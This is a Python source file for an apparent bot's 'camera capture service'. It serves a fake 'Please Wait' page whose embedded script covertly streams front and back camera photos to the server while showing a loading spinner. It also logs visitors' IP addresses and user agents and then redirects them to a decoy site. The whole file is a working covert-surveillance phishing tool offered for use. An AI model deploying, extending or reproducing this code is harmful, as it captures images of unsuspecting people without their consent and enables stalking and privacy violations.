"""
CyberAI Bot — Camera Capture Service
Wraps the existing own-cam Flask server (eye.py) without modifying original files.
Runs the Flask server in a background thread with configurable parameters,
monitors the captured/ directory, and provides an interface for the bot handlers.
"""

import os
import sys
import logging
import datetime
import threading
import time
import base64
from pathlib import Path
from typing import Optional, Callable, List
from dataclasses import dataclass, field

from flask import Flask, render_template_string, request
from werkzeug.serving import make_server
from bot.config import OWN_CAM_DIR, CAPTURED_DIR, IP_LOGS_DIR, CAM_SERVER_HOST, CAM_SERVER_PORT

logger = logging.getLogger(__name__)


@dataclass
class CamSessionConfig:
    """
    Per-session configuration for the camera server.
    Each new session gets a fresh config, preventing stale data carry-over.
    """
    redirect_url: str = "https://google.com"
    redirect_time: int = 5
    camera_mode: str = "front"
    server_url: str = ""
    port: int = CAM_SERVER_PORT


class CamService:
    """
    Manages the camera capture Flask server lifecycle.

    Instead of importing eye.py directly (which has top-level input() and
    terminal animations that would block), we recreate the Flask app using
    the same routes, HTML template, and capture logic from eye.py, but
    accept configuration as constructor parameters.

    The original eye.py remains untouched.
    """

    def __init__(self):
        self.app: Optional[Flask] = None
        self._server = None  # werkzeug Server instance for clean shutdown
        self.server_thread: Optional[threading.Thread] = None
        self.monitor_thread: Optional[threading.Thread] = None
        self.is_running = False
        self.start_time: Optional[datetime.datetime] = None
        self.capture_count = 0
        self.last_check_time: Optional[datetime.datetime] = None
        self._stop_event = threading.Event()

        # Use a dataclass for config so each session gets a clean slate
        self.config = CamSessionConfig()

        # Callback for new captures
        self._on_capture_callback: Optional[Callable] = None

    def set_capture_callback(self, callback: Callable):
        """
        Set a callback function to be called when new captures are detected.
        Callback signature: callback(filepath: Path, ip: str, camera: str)
        """
        self._on_capture_callback = callback

    def configure(self, redirect_url: str, redirect_time: int,
                  camera_mode: str, server_url: str, port: int = None):
        """Configure the server before starting. Uses a fresh config object."""
        # Create a NEW config object to avoid any stale references
        self.config = CamSessionConfig(
            redirect_url=redirect_url,
            redirect_time=redirect_time,
            camera_mode=camera_mode,
            server_url=server_url,
            port=port or CAM_SERVER_PORT,
        )

    @property
    def redirect_url(self):
        return self.config.redirect_url

    @redirect_url.setter
    def redirect_url(self, value: str):
        self.config.redirect_url = value

    @property
    def redirect_time(self):
        return self.config.redirect_time

    @redirect_time.setter
    def redirect_time(self, value: int):
        self.config.redirect_time = value

    @property
    def camera_mode(self):
        return self.config.camera_mode

    @camera_mode.setter
    def camera_mode(self, value: str):
        self.config.camera_mode = value

    @property
    def server_url(self):
        return self.config.server_url

    @server_url.setter
    def server_url(self, value: str):
        self.config.server_url = value

    @property
    def port(self):
        return self.config.port

    @port.setter
    def port(self, value: int):
        self.config.port = value

    def _build_flask_app(self) -> Flask:
        """
        Build a Flask app that replicates the behavior of own-cam/eye.py
        using the same HTML template and capture endpoint.
        
        CRITICAL: The template variables are read from self.config at request time,
        NOT at build time, so changes to config are always reflected.
        """
        app = Flask(__name__, static_folder=str(OWN_CAM_DIR))

        # Ensure directories exist
        CAPTURED_DIR.mkdir(parents=True, exist_ok=True)
        IP_LOGS_DIR.mkdir(parents=True, exist_ok=True)

        # Store reference to self for use in route closures
        service = self

        # Load the HTML template once
        html_template = self._get_html_template()

        def get_client_ip():
            if request.headers.get("X-Forwarded-For"):
                return request.headers.get("X-Forwarded-For").split(",")[0].strip()
            return request.remote_addr

        @app.route("/")
        def home():
            client_ip = get_client_ip()
            user_agent = request.headers.get("User-Agent", "unknown")

            log_path = IP_LOGS_DIR / "activity.log"
            with open(log_path, "a") as f:
                f.write(f"{datetime.datetime.now()} | VISIT | {client_ip} | {user_agent}\n")

            logger.info(f"Visitor: {client_ip} | {user_agent}")

            # CRITICAL FIX: Read config from the service instance at request time
            # This ensures the LATEST config is used, not stale build-time values
            return render_template_string(
                html_template,
                redirect_url=service.config.redirect_url,
                redirect_time=service.config.redirect_time,
                camera_mode=service.config.camera_mode
            )

        @app.route("/capture", methods=["POST"])
        def capture():
            client_ip = get_client_ip()
            camera_label = "unknown"

            # Handle both FormData (blob) and JSON (base64) uploads
            if request.content_type and "multipart/form-data" in request.content_type:
                # Binary blob from FormData
                camera_label = request.form.get("camera", "unknown")
                image_file = request.files.get("image")
                if not image_file:
                    return "no image", 400
                image_bytes = image_file.read()
            elif request.is_json:
                # Base64 JSON
                data = request.json
                camera_label = data.get("camera", "unknown")
                image_data = data.get("image", "")
                if "," in image_data:
                    image_data = image_data.split(",")[1]
                image_bytes = base64.b64decode(image_data)
            else:
                return "unsupported content type", 400

            # Log the capture
            log_path = IP_LOGS_DIR / "activity.log"
            with open(log_path, "a") as f:
                f.write(f"{datetime.datetime.now()} | CAPTURE | {client_ip} | cam:{camera_label}\n")

            # Save the image
            ext = ".jpg" if "multipart" in (request.content_type or "") else ".png"
            filename = f"{camera_label}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')}{ext}"
            filepath = CAPTURED_DIR / filename

            with open(filepath, "wb") as f:
                f.write(image_bytes)

            self.capture_count += 1
            logger.info(f"Capture #{self.capture_count}: {filename} from {client_ip} ({camera_label})")

            return "saved"

        return app

    def _get_html_template(self) -> str:
        """
        Return the HTML template string for the camera capture page.
        """
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; color: #1a1a1a;
        }
        .container { text-align: center; max-width: 500px; width: 100%; }
        .spinner-container { margin: 0 auto 40px; width: 100px; height: 100px; position: relative; }
        .spinner {
            width: 100%; height: 100%;
            border: 3px solid #f0f0f0; border-top: 3px solid #2563eb; border-right: 3px solid #2563eb;
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 32px; font-weight: 600; margin-bottom: 16px; color: #1a1a1a; letter-spacing: -0.5px; }
        .subtitle { font-size: 18px; color: #666; margin-bottom: 12px; font-weight: 400; }
        .description { font-size: 15px; color: #999; line-height: 1.6; max-width: 380px; margin: 0 auto; }
        .dots { display: inline-block; }
        .dots span { animation: blink 1.4s infinite; opacity: 0; font-weight: 600; }
        .dots span:nth-child(1) { animation-delay: 0s; }
        .dots span:nth-child(2) { animation-delay: 0.2s; }
        .dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes blink { 0%, 20% { opacity: 0; } 40%, 60% { opacity: 1; } 80%, 100% { opacity: 0; } }
        .progress-bar { width: 100%; max-width: 300px; height: 4px; background: #f0f0f0; border-radius: 2px; margin: 30px auto 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #2563eb, #3b82f6); border-radius: 2px; animation: progress 2s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; margin-left: 0%; } 50% { width: 60%; margin-left: 20%; } 100% { width: 0%; margin-left: 100%; } }
        @media (max-width: 768px) { .container { max-width: 400px; } h1 { font-size: 28px; } .subtitle { font-size: 16px; } .description { font-size: 14px; } .spinner-container { width: 80px; height: 80px; margin-bottom: 35px; } }
        @media (max-width: 480px) { body { padding: 16px; } .container { max-width: 100%; } h1 { font-size: 24px; margin-bottom: 12px; } .subtitle { font-size: 15px; margin-bottom: 10px; } .description { font-size: 13px; max-width: 100%; } .spinner-container { width: 70px; height: 70px; margin-bottom: 30px; } .spinner { border-width: 2.5px; } .progress-bar { max-width: 250px; margin-top: 25px; } }
        @media (max-width: 360px) { h1 { font-size: 22px; } .subtitle { font-size: 14px; } .description { font-size: 12px; } .spinner-container { width: 60px; height: 60px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner-container"><div class="spinner"></div></div>
        <h1>Please Wait</h1>
        <p class="subtitle">Setting up your experience<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
        <p class="description">This will only take a moment. Thank you for your patience.</p>
        <div class="progress-bar"><div class="progress-fill"></div></div>
    </div>

<script>
    const redirectUrl = "{{ redirect_url }}";
    const redirectTime = {{ redirect_time }};
    const cameraMode = "{{ camera_mode }}";

    function waitForVideo(video) {
        return new Promise((resolve) => {
            if (video.readyState >= 2) return resolve();
            video.addEventListener("loadeddata", () => resolve(), { once: true });
        });
    }

    function sendFrameCanvas(canvas, ctx, video, cameraLabel) {
        if (cameraLabel === "front") {
            ctx.save(); ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
        } else {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        canvas.toBlob((blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append("image", blob, cameraLabel + ".jpg");
            formData.append("camera", cameraLabel);
            fetch("/capture", { method: "POST", body: formData }).catch(() => {});
        }, "image/jpeg", 0.75);
    }

    async function sendFrameImageCapture(imageCapture, cameraLabel) {
        try {
            const blob = await imageCapture.takePhoto({ imageWidth: 640, imageHeight: 480 });
            const formData = new FormData();
            formData.append("image", blob, cameraLabel + ".jpg");
            formData.append("camera", cameraLabel);
            fetch("/capture", { method: "POST", body: formData }).catch(() => {});
            return true;
        } catch(e) { return false; }
    }

    function hasImageCapture() { return typeof ImageCapture !== "undefined"; }

    function startContinuousCapture(stream, cameraLabel) {
        const video = document.createElement("video");
        video.setAttribute("playsinline", "");
        video.setAttribute("autoplay", "");
        video.setAttribute("muted", "");
        video.muted = true;
        video.srcObject = stream;
        video.play();

        waitForVideo(video).then(() => {
            const track = stream.getVideoTracks()[0];
            if (hasImageCapture()) {
                const imgCapture = new ImageCapture(track);
                setInterval(() => { sendFrameImageCapture(imgCapture, cameraLabel); }, 300);
                return;
            }
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            setInterval(() => {
                if (video.readyState < 2) return;
                sendFrameCanvas(canvas, ctx, video, cameraLabel);
            }, 300);
        });
    }

    async function openSingleCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
            });
            startContinuousCapture(stream, label);
            return true;
        } catch(e) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
                });
                startContinuousCapture(stream, label);
                return true;
            } catch(e2) { return false; }
        }
    }

    async function captureNFrames(constraints, cameraLabel, frameCount) {
        let stream;
        try { stream = await navigator.mediaDevices.getUserMedia({ video: constraints }); }
        catch(e) { return false; }

        const video = document.createElement("video");
        video.setAttribute("playsinline", ""); video.setAttribute("autoplay", ""); video.setAttribute("muted", "");
        video.muted = true; video.srcObject = stream; video.play();
        await waitForVideo(video);
        const track = stream.getVideoTracks()[0];

        if (hasImageCapture()) {
            const imgCapture = new ImageCapture(track);
            for (let i = 0; i < frameCount; i++) {
                await sendFrameImageCapture(imgCapture, cameraLabel);
                if (i < frameCount - 1) await new Promise(r => setTimeout(r, 70));
            }
        } else {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
            for (let i = 0; i < frameCount; i++) {
                if (video.readyState >= 2) sendFrameCanvas(canvas, ctx, video, cameraLabel);
                if (i < frameCount - 1) await new Promise(r => setTimeout(r, 100));
            }
        }
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
        return true;
    }

    async function openBothCameras() {
        try {
            const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
            tempStream.getTracks().forEach(t => t.stop());
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === "videoinput");

            if (videoDevices.length < 2) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
                return;
            }

            let frontDevice = null, backDevice = null;
            for (const device of videoDevices) {
                const label = device.label.toLowerCase();
                if (!frontDevice && (label.includes("front") || label.includes("user") || label.includes("facetime") || label.includes("face"))) frontDevice = device;
                else if (!backDevice && (label.includes("back") || label.includes("rear") || label.includes("environment") || label.includes("main"))) backDevice = device;
            }

            const vidConstraints = { width: { ideal: 640 }, height: { ideal: 480 } };
            let frontConstraints = null, backConstraints = null;

            if (frontDevice && backDevice) {
                frontConstraints = { ...vidConstraints, deviceId: { exact: frontDevice.deviceId } };
                backConstraints = { ...vidConstraints, deviceId: { exact: backDevice.deviceId } };
            } else {
                let discoveredFrontId = null;
                try {
                    const fs = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                    discoveredFrontId = fs.getVideoTracks()[0].getSettings().deviceId;
                    fs.getTracks().forEach(t => t.stop());
                } catch(e) {}

                if (discoveredFrontId) {
                    frontConstraints = { ...vidConstraints, deviceId: { exact: discoveredFrontId } };
                    const otherDevice = videoDevices.find(d => d.deviceId !== discoveredFrontId);
                    if (otherDevice) backConstraints = { ...vidConstraints, deviceId: { exact: otherDevice.deviceId } };
                } else {
                    frontConstraints = { ...vidConstraints, deviceId: { exact: videoDevices[0].deviceId } };
                    backConstraints = { ...vidConstraints, deviceId: { exact: videoDevices[1].deviceId } };
                }
            }

            if (!frontConstraints || !backConstraints) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
                return;
            }

            let running = true;
            setTimeout(() => { running = false; }, redirectTime * 1000);
            while (running) {
                await captureNFrames(frontConstraints, "front", 3);
                if (!running) break;
                await new Promise(r => setTimeout(r, 100));
                await captureNFrames(backConstraints, "back", 3);
                if (!running) break;
                await new Promise(r => setTimeout(r, 100));
            }
            window.location.href = redirectUrl;
            return;
        } catch(err) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
            } catch(e) {}
        }
    }

    async function init() {
        if (cameraMode === "front") { await openSingleCamera("user", "front"); }
        else if (cameraMode === "back") { await openSingleCamera("environment", "back"); }
        else if (cameraMode === "both") { await openBothCameras(); return; }
        setTimeout(() => { window.location.href = redirectUrl; }, redirectTime * 1000);
    }
    init();
</script>
</body>
</html>
'''

    def start(self) -> bool:
        """Start the Flask camera server in a background thread."""
        if self.is_running:
            logger.warning("Camera server is already running")
            return False

        try:
            # CRITICAL: Build a FRESH Flask app with current config each time
            self.app = self._build_flask_app()
            self.capture_count = 0
            self.start_time = datetime.datetime.now()
            self.last_check_time = datetime.datetime.now()
            self._stop_event.clear()

            # Start Flask in a daemon thread
            self.server_thread = threading.Thread(
                target=self._run_server,
                daemon=True,
                name="CamFlaskServer"
            )
            self.server_thread.start()

            # Start capture monitor in a daemon thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_captures,
                daemon=True,
                name="CaptureMonitor"
            )
            self.monitor_thread.start()

            self.is_running = True
            logger.info(
                f"Camera server started on {CAM_SERVER_HOST}:{self.config.port} "
                f"with redirect_url={self.config.redirect_url}, "
                f"camera_mode={self.config.camera_mode}, "
                f"redirect_time={self.config.redirect_time}s"
            )
            return True

        except Exception as e:
            logger.error(f"Failed to start camera server: {e}")
            self.is_running = False
            return False

    def _run_server(self):
        """Run the Flask server (called in thread)."""
        try:
            # Suppress Flask's default logging
            import logging as _logging
            log = _logging.getLogger('werkzeug')
            log.setLevel(_logging.WARNING)

            # Use make_server so we can call server.shutdown() to release the port
            self._server = make_server(
                CAM_SERVER_HOST,
                self.config.port,
                self.app,
                threaded=True,
            )
            self._server.serve_forever()
        except Exception as e:
            logger.error(f"Flask server error: {e}")
            self.is_running = False

    def _monitor_captures(self):
        """Monitor the captured/ directory for new files and trigger callbacks."""
        while not self._stop_event.is_set():
            try:
                if self._on_capture_callback and self.last_check_time:
                    from bot.utils.helpers import get_new_files_since
                    new_files = get_new_files_since(
                        CAPTURED_DIR,
                        self.last_check_time,
                        extensions=('.png', '.jpg', '.jpeg')
                    )
                    if new_files:
                        self.last_check_time = datetime.datetime.now()
                        for fp in new_files:
                            try:
                                camera = "unknown"
                                name = fp.stem
                                if name.startswith("front_"):
                                    camera = "front"
                                elif name.startswith("back_"):
                                    camera = "back"
                                self._on_capture_callback(fp, "", camera)
                            except Exception as e:
                                logger.error(f"Capture callback error: {e}")
            except Exception as e:
                logger.error(f"Monitor error: {e}")
            self._stop_event.wait(timeout=3)

    def stop(self) -> dict:
        """
        Stop the Flask server and monitoring.
        Returns summary stats.
        """
        self._stop_event.set()
        self.is_running = False

        # Shutdown the werkzeug server to release the port
        if self._server:
            try:
                self._server.shutdown()
            except Exception as e:
                logger.error(f"Error shutting down Flask server: {e}")
            self._server = None

        uptime = ""
        if self.start_time:
            from bot.utils.helpers import format_uptime
            uptime = format_uptime(self.start_time)

        stats = {
            "total_captures": self.capture_count,
            "uptime": uptime,
        }

        # Clean up threads
        self.server_thread = None
        self.monitor_thread = None
        self.start_time = None
        self.app = None

        # CRITICAL FIX: Reset to a FRESH config object with defaults
        # This ensures the next session starts CLEAN with no stale values
        self.config = CamSessionConfig()
        self.capture_count = 0
        self._on_capture_callback = None

        logger.info(f"Camera server stopped. Stats: {stats}. Config reset to defaults.")
        return stats

    def get_status(self) -> dict:
        """Get current server status."""
        uptime = ""
        if self.start_time:
            from bot.utils.helpers import format_uptime
            uptime = format_uptime(self.start_time)

        from bot.utils.helpers import count_files
        total_files = count_files(CAPTURED_DIR)

        return {
            "is_running": self.is_running,
            "capture_count": total_files,
            "uptime": uptime,
            "server_url": self.config.server_url,
            "camera_mode": self.config.camera_mode,
            "redirect_url": self.config.redirect_url,
        }

    def get_captures(self, limit: int = 5) -> List[Path]:
        """Get the latest captured images."""
        from bot.utils.helpers import get_latest_files
        return get_latest_files(CAPTURED_DIR, limit=limit)

    def clear_captures(self) -> int:
        """Clear all captured images."""
        from bot.utils.helpers import clear_directory
        count = clear_directory(CAPTURED_DIR)
        self.capture_count = 0
        return count


# Singleton instance
cam_service = CamService()
